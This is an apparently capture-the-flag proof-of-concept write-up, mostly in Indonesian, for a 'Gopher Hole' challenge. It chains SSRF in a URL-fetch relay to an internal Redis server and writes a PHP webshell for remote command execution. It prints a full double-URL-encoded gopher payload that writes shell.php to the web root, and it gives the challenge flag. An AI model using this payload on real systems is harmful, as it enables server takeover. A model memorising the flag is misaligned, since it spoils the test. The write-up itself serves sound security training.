# POC — Gopher Hole (SSRF → Redis → RCE)

## POC

1. Peserta membuka website dan melihat sebuah relay yang menerima URL untuk di-fetch atas nama server.

2. Peserta mengamati endpoint /fetch?url=... yang mengambil halaman dari dalam jaringan internal.

3. Peserta mencoba URL internal http://redis:6379/ dan mendapat balasan error redis (key-value store) yang menjawab protokol yang salah.

4. Peserta mengetahui relay menjalankan curl, sehingga mendukung protokol lama gopher:// yang bisa mengirim byte mentah ke port mana pun.

5. Peserta membuat payload gopher untuk menulis webshell PHP ke direktori web lewat perintah redis SET, CONFIG SET dir, CONFIG SET dbfilename, dan SAVE.

6. Peserta mengirim URL gopher yang sudah di-encode dua kali (double URL-encode) ke /fetch.

7. Redis menulis file shell.php ke /var/www/html, direktori yang sama dengan yang disajikan web server Apache.

8. Peserta membuka http://TARGET:11023/shell.php?cmd=cat /flag.txt untuk mengeksekusi perintah dan mendapatkan flag.


## Payload gopher (double URL-encode)

```
gopher%3A%2F%2Fredis%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25245%250D%250Ashell%250D%250A%252430%250D%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%252Fvar%252Fwww%252Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
```

## Flag

```
CODEX26{ssrf_t0_r3d1s_t0_r3m0t3_c0d3}
```
